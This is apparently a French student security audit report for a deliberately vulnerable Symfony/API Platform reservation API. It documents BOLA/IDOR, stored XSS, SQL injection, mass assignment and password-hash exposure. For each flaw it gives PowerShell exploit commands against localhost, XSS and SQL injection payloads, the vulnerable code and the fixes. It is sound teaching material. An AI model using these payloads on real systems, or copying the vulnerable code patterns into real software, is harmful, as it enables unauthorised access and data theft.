# SECURITY_AUDIT.md — Reservation Security

Projet d'évaluation — Sécurité Web M1 (EEMI)

---

## 1. Présentation du projet

Ce projet est une API REST de gestion de réservations (salles de coworking),
développée avec **Symfony 7.4** et **API Platform**, servant de support
pédagogique pour démontrer la compréhension, l'exploitation contrôlée et la
correction de vulnérabilités web/API modernes (référentiel OWASP).

Le dépôt contient deux versions de l'application dans des branches distinctes :

- **`vulnerable`** : contient volontairement 4 vulnérabilités obligatoires +
  1 vulnérabilité bonus, exploitables et documentées.
- **`secure`** : reprend la même application avec les vulnérabilités
  corrigées à la racine (pas de simple blocage de payload).

### Fonctionnalités de l'application

- Authentification par email/mot de passe (JWT)
- Deux rôles : `ROLE_USER` et `ROLE_ADMIN`
- Ressource métier `Reservation` (nom de la ressource réservée, date, statut,
  note, propriétaire)
- CRUD complet exposé via API Platform
- Un endpoint de recherche custom (`/api/reservations/search`)
- Un mini client HTML/JS pour tester l'affichage des réservations

### Stack technique

| Composant | Techno |
|---|---|
| Backend / API | Symfony 7.4 + API Platform |
| ORM / Base de données | Doctrine ORM + PostgreSQL 16 |
| Authentification | JWT (LexikJWTAuthenticationBundle) |
| Conteneurisation | Docker + Docker Compose |
| Serveur web | Nginx + PHP-FPM |
| Client de test API | Page HTML/JS simple |
| Outils de test des failles | Postman, PowerShell (Invoke-RestMethod) |
| Gestion de version | Git (GitHub), branches `vulnerable` et `secure` |

---

## 2. Installation et lancement

### Prérequis

- Docker Desktop
- Git

### Étapes

```bash
git clone https://github.com/BonnetRouge/reservation-security.git
cd reservation-security
git checkout vulnerable   # ou "secure" pour la version corrigée

docker compose build
docker compose up -d

docker compose exec php php bin/console doctrine:migrations:migrate
docker compose exec php php bin/console doctrine:fixtures:load
```

L'application est accessible sur : **http://localhost:8086**

Le client de test HTML est accessible sur : **http://localhost:8086/client-test/index.html**

### Récupérer un token JWT (exemple PowerShell)

```powershell
$response = Invoke-RestMethod -Uri "http://localhost:8086/api/login" -Method Post -ContentType "application/json" -Body '{"email":"user@test.com","password":"password123"}'
$token = $response.token
```

---

## 3. Comptes de test

| Email | Mot de passe | Rôle |
|---|---|---|
| `user@test.com` | `password123` | `ROLE_USER` |
| `admin@test.com` | `password123` | `ROLE_ADMIN` |

Ces comptes sont créés automatiquement via les fixtures
(`src/DataFixtures/AppFixtures.php`), avec chacun une réservation de test
associée.

---

## 4. Organisation Git

Le dépôt est structuré en 3 branches :

- **`main`** : socle commun (Docker, Symfony, authentification JWT, entités
  de base) sans aucune vulnérabilité volontaire ni correction spécifique.
- **`vulnerable`** : construite à partir de `main`, contient les 4
  vulnérabilités obligatoires + 1 bonus, chacune exploitée et prouvée
  (voir dossier `captures/vulnerable/`).
- **`secure`** : construite à partir de `vulnerable`, contient les
  corrections appliquées une par une, avec des commits dédiés par
  vulnérabilité corrigée pour faciliter la relecture.

Historique des commits notables sur `secure` :
- `Fix BOLA/IDOR: add ownership Voter + collection filtering`
- `Fix Mass Assignment: serialization groups + auto-assign owner via processor`
- `Fix SQL Injection: use parameterized query in SearchController`
- `Fix stored XSS: use textContent instead of innerHTML in test client`
- `Fix Information Disclosure: restrict /api/users to admins + exclude password from serialization`

---

## 5. Liste des vulnérabilités intégrées

| # | Vulnérabilité | Type OWASP | Endpoint / zone |
|---|---|---|---|
| 1 | Broken Object Level Authorization | Broken Access Control (BOLA/IDOR) | `GET/PATCH/DELETE /api/reservations/{id}`, `GET /api/reservations` |
| 2 | Cross-Site Scripting stocké | Injection (XSS) | Champ `note`, client `client-test/index.html` |
| 3 | SQL Injection | Injection | `GET /api/reservations/search?q=` |
| 4 | Mass Assignment | Broken Object Property Level Authorization | `POST/PATCH /api/reservations` (champ `owner`) |
| Bonus | Information Disclosure | Sensitive Data Exposure | `GET /api/users` (hash de mots de passe exposés) |

---

## 6. Audit détaillé des vulnérabilités

### 6.1 — Broken Object Level Authorization (BOLA/IDOR)

**Endpoint concerné** : `GET/PATCH/DELETE /api/reservations/{id}`, `GET /api/reservations`

**Description** : un utilisateur authentifié avec le rôle `ROLE_USER`
pouvait consulter, modifier et lister l'intégralité des réservations,
y compris celles appartenant à d'autres utilisateurs, en itérant
simplement sur l'`id` de la ressource.

**Cause technique** : API Platform génère le CRUD par défaut sur l'entité
`Reservation` sans règle de sécurité configurée sur les opérations.
Seule l'authentification (`IS_AUTHENTICATED_FULLY`) était vérifiée, sans
condition d'ownership.

**Exploitation** :
```powershell
$response = Invoke-RestMethod -Uri "http://localhost:8086/api/login" -Method Post -ContentType "application/json" -Body '{"email":"user@test.com","password":"password123"}'
$token = $response.token

Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/2" -Method Patch -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/merge-patch+json" } -Body '{"status":"cancelled"}'
```

**Payload utilisé** : `{"status":"cancelled"}` envoyé sur une réservation
appartenant à `admin@test.com`.

**Preuve — réponse serveur (200 OK)** :
```json
{
  "id": 2,
  "resourceName": "Salle de coworking B",
  "status": "cancelled",
  "owner": { "id": 4, "email": "admin@test.com", ... }
}
```
Voir capture : `captures/vulnerable/01-bola-idor/`

**Impact** :
- Technique : contournement total du contrôle d'accès au niveau objet.
- Métier : n'importe quel client authentifié pouvait consulter, modifier ou
  annuler les réservations de n'importe quel autre client ou de l'admin.

**Criticité** : Élevée

**Correction appliquée (branche `secure`)** :
- Création d'un `ReservationVoter` (`src/Security/Voter/ReservationVoter.php`)
  vérifiant que l'utilisateur connecté est soit le propriétaire de la
  réservation, soit un administrateur.
- Application du Voter sur les opérations `Get`, `Patch`, `Delete` de
  `Reservation` via l'attribut `security` d'API Platform :
  `is_granted('RESERVATION_VIEW'|'RESERVATION_EDIT', object)`.
- Ajout d'une extension Doctrine (`ReservationOwnerExtension`) filtrant la
  collection `GET /api/reservations` pour qu'un `ROLE_USER` ne voie que ses
  propres réservations (les admins continuent de tout voir).

**Validation après correction** :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/2" -Method Patch -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/merge-patch+json" } -Body '{"status":"hacked"}'
# -> 403 Forbidden

Invoke-RestMethod -Uri "http://localhost:8086/api/reservations" -Method Get -Headers @{ Authorization = "Bearer $token" }
# -> totalItems: 1 (au lieu de 2), uniquement la réservation du user connecté
```

---

### 6.2 — XSS stocké (Stored Cross-Site Scripting)

**Endpoint / zone concernée** : champ `note` de `Reservation`, affiché dans
`client-test/index.html`.

**Description** : le contenu du champ `note` était inséré directement dans
le DOM via `innerHTML`, sans échappement, permettant l'exécution de code
JavaScript arbitraire pour toute personne consultant la liste des
réservations.

**Cause technique** :
```javascript
div.innerHTML = `<strong>${r.resourceName}</strong> - ${r.note}`;
```

**Exploitation** :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/1" -Method Patch -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/merge-patch+json" } -Body '{"note":"<img src=x onerror=alert(document.cookie)>"}'
```

**Payload utilisé** : `<img src=x onerror=alert(document.cookie)>`

**Preuve** : en ouvrant `http://localhost:8086/client-test/index.html` et en
s'authentifiant, une alerte JavaScript se déclenche automatiquement au
chargement de la page. Voir captures :
`captures/vulnerable/02-xss-stored/xss-alert-declenchee.png` et
`xss-page-apres-alerte.png`.

**Impact** :
- Technique : exécution de JavaScript arbitraire dans le navigateur de toute
  personne consultant la page.
- Métier : vol potentiel de token/session, défacement, actions à l'insu de
  la victime (y compris un administrateur).

**Criticité** : Élevée

**Correction appliquée (branche `secure`)** :
Remplacement de `innerHTML` par `textContent` dans `client-test/index.html` :
```javascript
note.textContent = r.note; // échappé automatiquement, jamais exécuté comme HTML
```

**Validation après correction** : le payload injecté s'affiche désormais en
texte brut à l'écran (`<img src=x onerror=...>` visible tel quel), aucune
alerte ne se déclenche.

---

### 6.3 — SQL Injection

**Endpoint concerné** : `GET /api/reservations/search?q={payload}`

**Description** : l'endpoint de recherche construisait sa requête SQL en
concaténant directement le paramètre `q`, sans requête préparée.

**Cause technique** :
```php
$sql = "SELECT * FROM reservation WHERE resource_name LIKE '%" . $query . "%'";
$results = $connection->fetchAllAssociative($sql);
```

**Exploitation** :

Test 1 — payload cassant la syntaxe SQL :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/search?q=xyz'" -Method Get -Headers @{ Authorization = "Bearer $token" }
```
**Réponse serveur (500)** :
```
SQLSTATE[42601]: Syntax error: 7 ERROR: unterminated quoted string at or near "'"
```

Test 2 — payload de contournement de la clause WHERE :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/search?q=xyz%25' OR '1'='1' --" -Method Get -Headers @{ Authorization = "Bearer $token" }
```
**Payload décodé** : `xyz%' OR '1'='1' --`
**Résultat** : toutes les réservations sont retournées (200 OK), y compris
celles n'ayant aucun rapport avec "xyz".

Voir captures : `captures/vulnerable/03-sql-injection/`

**Impact** :
- Technique : lecture arbitraire de données, message d'erreur SQL exposé,
  risque d'exfiltration via `UNION SELECT` (ex : table `user` et ses hash de
  mots de passe).
- Métier : fuite potentielle de l'ensemble des données de réservation et des
  comptes utilisateurs.

**Criticité** : Critique

**Correction appliquée (branche `secure`)** : remplacement par une requête
paramétrée :
```php
$sql = 'SELECT * FROM reservation WHERE resource_name LIKE :search';
$results = $connection->fetchAllAssociative($sql, ['search' => '%' . $query . '%']);
```

**Validation après correction** :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/search?q=xyz'" -Method Get -Headers @{ Authorization = "Bearer $token" }
# -> plus d'erreur 500, l'apostrophe est traitée comme un simple caractère

Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/search?q=xyz%25' OR '1'='1' --" -Method Get -Headers @{ Authorization = "Bearer $token" } | ConvertTo-Json
# -> { "value": [], "Count": 0 } — plus de bypass de la clause WHERE
```

---

### 6.4 — Mass Assignment

**Endpoint concerné** : `POST/PATCH /api/reservations`

**Description** : l'API acceptait, sans restriction, n'importe quel champ
envoyé dans le body JSON — y compris `owner`, permettant à un utilisateur de
s'attribuer une réservation appartenant à un autre utilisateur.

**Cause technique** : aucune whitelist ni groupe de sérialisation ne
restreignait les champs modifiables via l'API.

**Exploitation** :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/2" -Method Patch -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/merge-patch+json" } -Body '{"owner":"/api/users/3"}'
```

**Payload utilisé** : `{"owner":"/api/users/3"}`

**Preuve — réponse serveur (200 OK)** :
```json
{ "id": 2, "owner": "/api/users/3" }
```
Le champ `owner` est passé de `/api/users/4` (admin) à `/api/users/3`
(l'attaquant). Voir capture : `captures/vulnerable/04-mass-assignment/`.

**Impact** :
- Technique : n'importe quel champ de l'entité était modifiable via l'API.
- Métier : vol de propriété d'une ressource appartenant à un autre client ou
  à un administrateur.

**Criticité** : Élevée

**Correction appliquée (branche `secure`)** :
- Ajout de groupes de sérialisation (`reservation:read` / `reservation:write`)
  sur l'entité `Reservation` : le champ `owner` est en lecture seule
  (`reservation:read` uniquement, absent de `reservation:write`).
- Création d'un `ReservationOwnerProcessor` (`src/State/ReservationOwnerProcessor.php`)
  qui assigne automatiquement `owner` = utilisateur connecté à la création,
  indépendamment de ce qui est envoyé dans le body.

**Validation après correction** :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/1" -Method Patch -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/merge-patch+json" } -Body '{"owner":"/api/users/4"}'
# -> owner reste /api/users/3, la modification est ignorée

Invoke-RestMethod -Uri "http://localhost:8086/api/reservations" -Method Post -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/ld+json" } -Body '{"resourceName":"Salle Piegee","startAt":"2026-08-02T10:00:00+00:00","status":"pending","note":"test","owner":"/api/users/4"}'
# -> owner assigné automatiquement à /api/users/3, malgré la tentative de forcer /api/users/4
```

---

### 6.5 — Bonus : Information Disclosure

**Endpoint concerné** : `GET /api/users`, champ `owner` dans les réponses
`Reservation`.

**Description** : la liste complète des utilisateurs était accessible à
tout utilisateur authentifié (y compris `ROLE_USER`), avec le hash bcrypt du
mot de passe exposé en clair dans la réponse JSON.

**Exploitation** :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/users" -Method Get -Headers @{ Authorization = "Bearer $token" }
```

**Preuve — réponse serveur (200 OK)** :
```json
{
  "member": [
    { "id": 3, "email": "user@test.com", "password": "$2y$13$SOx1Q0..." },
    { "id": 4, "email": "admin@test.com", "password": "$2y$13$aLhPX7..." }
  ]
}
```
Voir capture : `captures/vulnerable/bonus-information-disclosure/`

**Impact** : exposition des hash bcrypt de tous les comptes, y compris
l'admin, exploitable via attaque hors-ligne (dictionnaire/brute force).

**Criticité** : Élevée

**Correction appliquée (branche `secure`)** :
- Le champ `password` n'a plus aucun groupe de sérialisation → jamais inclus
  dans une réponse API, quel que soit le contexte.
- `GetCollection` sur `User` restreinte aux administrateurs :
  `security: "is_granted('ROLE_ADMIN')"`.
- `Get` (détail d'un user) restreint à l'admin ou à l'utilisateur consultant
  sa propre fiche : `is_granted('ROLE_ADMIN') or object == user`.

**Validation après correction** :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/users" -Method Get -Headers @{ Authorization = "Bearer $token" }
# -> 403 Forbidden pour un ROLE_USER

Invoke-RestMethod -Uri "http://localhost:8086/api/users" -Method Get -Headers @{ Authorization = "Bearer $adminToken" }
# -> 200 OK pour un admin, mais sans le champ "password" dans la réponse
```

---

## 7. Corrections appliquées dans la branche `secure`

Résumé synthétique des mécanismes de correction mis en place :

| Vulnérabilité | Mécanisme de correction |
|---|---|
| BOLA/IDOR | Voter Symfony (`ReservationVoter`) + extension Doctrine de filtrage de collection |
| XSS stocké | `textContent` au lieu de `innerHTML` côté client |
| Injection SQL | Requête paramétrée (placeholder `:search`) via Doctrine DBAL |
| Mass Assignment | Groupes de sérialisation + `Processor` custom forçant l'ownership serveur |
| Information Disclosure | Exclusion du champ `password` des groupes de sérialisation + restriction d'accès par rôle |

Toutes les corrections traitent la cause profonde de chaque faille (contrôle
d'accès au niveau objet, échappement systématique, paramétrage des requêtes,
whitelist de champs, exclusion de données sensibles), et non un simple
blocage de payload ponctuel.

---

## 8. Validation après correction

L'ensemble des tests de non-régression et de validation des corrections sont
détaillés section par section dans la partie 6 de ce rapport. En synthèse :

- Un utilisateur standard (`ROLE_USER`) ne peut plus accéder ni modifier les
  ressources d'un autre utilisateur.
- La liste des réservations est désormais filtrée par propriétaire.
- Les payloads d'injection SQL ne provoquent plus d'erreur serveur et ne
  contournent plus les filtres de recherche.
- Le contenu injecté dans le champ `note` ne s'exécute plus jamais comme du
  code, quel que soit son contenu.
- Le champ `owner` d'une réservation ne peut plus être modifié par le client,
  ni à la création ni à la modification.
- Les données sensibles (mots de passe hashés) ne sont plus jamais exposées
  via l'API, et la liste des comptes est restreinte aux administrateurs.

---

## 9. Limites du projet

- L'application reste volontairement minimale (pas de pagination avancée,
  pas de gestion fine des conflits de créneaux, pas d'interface graphique
  complète) — l'objectif du projet étant centré sur la sécurité et non la
  richesse fonctionnelle.
- Le rate limiting sur l'endpoint de login n'a pas été implémenté (bonus non
  traité par manque de temps).
- Le stockage du token JWT côté client de test se fait en variable
  JavaScript locale (via `prompt()`), ce qui reste plus sûr qu'un stockage en
  `localStorage`, mais un vrai frontend de production nécessiterait une
  gestion de session plus robuste (cookies `httpOnly` par exemple).
- Aucune pipeline CI/CD (GitHub Actions, SonarQube, etc.) n'a été mise en
  place pour cette version M1, celle-ci étant un bonus facultatif selon le
  sujet.
- Les tests automatisés de sécurité (ex : suite de tests PHPUnit dédiée aux
  vulnérabilités) n'ont pas été écrits ; toute la validation a été effectuée
  manuellement via Postman et PowerShell.

---

## 10. Conclusion

Ce projet a permis de mettre en pratique un cycle complet d'audit de
sécurité applicative : conception d'une API volontairement vulnérable,
exploitation contrôlée de 4 vulnérabilités obligatoires (BOLA/IDOR, XSS
stocké, injection SQL, Mass Assignment) ainsi que d'une vulnérabilité bonus
(Information Disclosure), documentation rigoureuse de chaque faille avec
preuves techniques, puis correction de la cause profonde de chacune d'entre
elles dans une branche dédiée.

Au-delà de la correction technique, ce travail a permis de mieux comprendre
pourquoi ces vulnérabilités surviennent dans des frameworks modernes comme
Symfony/API Platform malgré leurs mécanismes de sécurité intégrés — la
sécurité par défaut d'un framework ne suffit pas sans une configuration
explicite du contrôle d'accès au niveau objet, du paramétrage des requêtes,
et de la restriction des champs sérialisables.
